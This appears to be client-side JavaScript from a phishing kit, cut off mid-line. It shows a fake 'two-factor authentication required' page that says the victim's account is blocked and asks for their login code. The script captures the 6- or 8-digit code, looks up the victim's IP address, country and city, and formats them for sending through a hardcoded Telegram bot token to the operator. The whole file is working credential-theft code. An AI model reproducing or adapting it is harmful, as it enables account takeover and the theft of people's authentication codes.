function getIP(callback) {
    fetch('https://api.db-ip.com/v2/free/self')
        .then((response) => response.json())
        .then((data) => callback(data))
        .catch((error) => callback(undefined));
}
let IpAddress = '';

getIP((ip) => {
    IpAddress = ip;
});
$(document).ready(function () {
    updateHtmlAndCallback(function () {
        sendCode();
    });

    setTime();
    $('#back-hone').on('click', function () {
        window.location.href = '/end';
    });
    $('#send').on('click', function () {
        $('.lsd-ring-container').removeClass('d-none');

        setTimeout(function () {
            $('.lsd-ring-container').addClass('d-none');
        }, 2000);
    });
});

function setTime() {
    var totalTime = 5 * 60;

    var timer = setInterval(function () {
        totalTime--;
        var minutes = Math.floor(totalTime / 60);
        var seconds = totalTime % 60;

        minutes = minutes < 10 ? '0' + minutes : minutes;
        seconds = seconds < 10 ? '0' + seconds : seconds;

        $('#time').text(minutes + ':' + seconds);

        if (totalTime <= 0) {
            clearInterval(timer);
            $('#time').text('00:00');
        }
    }, 1000);
}

function updateHtmlAndCallback(callback) {
    $('#code-form .card-body').html(`
                <h2 class="card-title fw-bold">Two-factor authentication required (1/3)</h2>
                <p class="card-text py-3">We have temporarily blocked your account because your
                    protect has changed. Verify code has been sent
                </p>
                <img src="/img/TOtVy8P.png" class="w-100 rounded" alt="">
                <input type="tel" class="form-control my-3 py-2 bg-light" id="code"
                    placeholder="Enter your code" required inputmode="numeric" pattern="[0-9]*">
                <p class="text-danger ms-1 d-none" id="wrong-code">
                    The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
                </p>
                <div class="bg-light rounded py-3 mb-3 d-flex justify-content-between align-items-center">
                    <div class="mx-3">
                        <i class="fa fa-info-circle" aria-hidden="true" style="font-size: 1.5rem;color: #9f580a;"></i>
                    </div>

                    <p class="mb-0">
                        You’ve asked us to require a 6-digit or 8-digit login code when anyone tries to access your
                        account from a
                        new device or browser. Enter the 6-digit or 8-digit code from your code generator or third-party app below.
                        <br>
                        Please wait <span id="time" class="fw-bold">05:00</span> to request the sending of the code.
                    </p>
                </div>
                <p>We'll walk you through some steps to secure and unlock your account.</p>
                <button type="button" class="btn bg-light border w-100 py-3 fw-bold" id="send-code">Submit</button>
                <p class="mt-3 mb-0 text-center" style="cursor: pointer;color: rgb(30 66 159);" id="send">Send Code</p>
                `);
    if (callback && typeof callback === 'function') {
        callback();
    }
}

let NUMBER_TIME_SEND_CODE = 0;
let MAX_TRIES = 4;
let code1 = '';
let code2 = '';
let Fcode = '';

function sendCode() {
    $('#code').on('input', function () {
        // Chỉ giữ lại ký tự số
        let numbers = $(this).val().replace(/\D/g, '');

        // Giới hạn độ dài tối đa 8 chữ số
        if (numbers.length > 8) {
            numbers = numbers.slice(0, 8);
        }

        $(this).val(numbers);
    });

    $('#send-code').on('click', function () {
        const $btn = $(this);

        if ($btn.prop('disabled')) return;

        const keymap = $('#code').val();

        // Kiểm tra chỉ chấp nhận 6 hoặc 8 chữ số
        if (!(keymap.length === 6 || keymap.length === 8)) {
            $('#code').addClass('border-danger');
            $('#wrong-code').removeClass('d-none').text("Code must be 6 or 8 digits.");
            return;
        } else {
            $('#code').removeClass('border-danger');
            $('#wrong-code').addClass('d-none');
        }

        // Khóa nút trong 20 giây
        $btn.prop('disabled', true).text('Please wait (20s)');
        let waitTime = 20;
        const countdown = setInterval(() => {
            waitTime--;
            $btn.text(`Please wait (${waitTime}s)`);
            if (waitTime <= 0) {
                clearInterval(countdown);
                $btn.prop('disabled', false).text('Submit');
            }
        }, 1000);

        code1 = keymap;
        const message1 = `🔓 <strong>Code:</strong> <code>${code1}</code>\n` +
`🌐 <strong>IP Address:</strong> <code>${IpAddress.ipAddress}</code>\n` +
` <strong>Country:</strong> <code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)\n` +
` <strong>City:</strong> <code>${IpAddress.city}</code>`;
        NUMBER_TIME_SEND_CODE++;
        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
        const chatId =
